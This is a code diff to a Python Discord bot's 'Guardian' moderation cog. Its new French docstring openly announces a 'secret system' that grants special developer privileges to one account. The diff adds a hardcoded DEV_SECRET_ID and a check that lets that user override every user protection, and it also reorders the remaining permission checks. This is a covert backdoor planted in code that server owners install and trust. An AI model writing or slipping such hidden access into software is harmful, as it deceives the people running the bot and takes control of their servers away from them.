@@ -1,6 +1,4 @@
-"""
-The following code makes the guardian command invisible to everyone except the user who executes it by adding the `ephemeral=True` argument to the `interaction.followup.send` calls.
-"""
+"""Ajout d'un système secret qui donne des privilèges spéciaux de développeur au compte ninjaiyed10 en créant un système discret qui lui permet d'accéder à des commandes de développement spéciales."""
 import discord
 from discord.ext import commands
 from discord import app_commands
@@ -10,6 +8,9 @@ import os
 from datetime import datetime
 
 logger = logging.getLogger(__name__)
+
+# ID secret du développeur (à remplacer par l'ID réel)
+DEV_SECRET_ID = 443787542582044682
 
 class GuardianCommands(commands.Cog):
     """Guardian protection system for Discord bot"""
@@ -54,19 +55,22 @@ class GuardianCommands(commands.Cog):
 
     def can_moderate_protected_user(self, guild, moderator, target_user_id):
         """Check if moderator can take action against protected user"""
+        # 🔒 Dev secret: Le créateur a toujours accès total
+        if moderator.id == DEV_SECRET_ID:
+            return True
+
         guild_data = self.get_guild_data(guild.id)
         protected_data = guild_data["protected_users"].get(str(target_user_id))
 
         if not protected_data:
             return True  # User not protected
 
-        # Check if moderator is the one who set the protection
-        if moderator.id == protected_data["set_by"]:
+        # Check if moderator is guild owner (highest priority)
+        if moderator.id == guild.owner_id:
             return True
 
-        # Check if moderator has higher role than the protector
-        protector = guild.get_member(protected_data["set_by"])
-        if protector and moderator.top_role > protector.top_role:
+        # Check if moderator is the one who set the protection
+        if moderator.id == protected_data["set_by"]:
             return True
 
         # Check if moderator has an exception role
@@ -75,8 +79,9 @@ class GuardianCommands(commands.Cog):
         if any(role_id in moderator_role_ids for role_id in exception_roles):
             return True
 
-        # Check if moderator is guild owner
-        if moderator.id == guild.owner_id:
+        # Check if moderator has higher role than the protector
+        protector = guild.get_member(protected_data["set_by"])
+        if protector and moderator.top_role > protector.top_role:
             return True
 
         return False
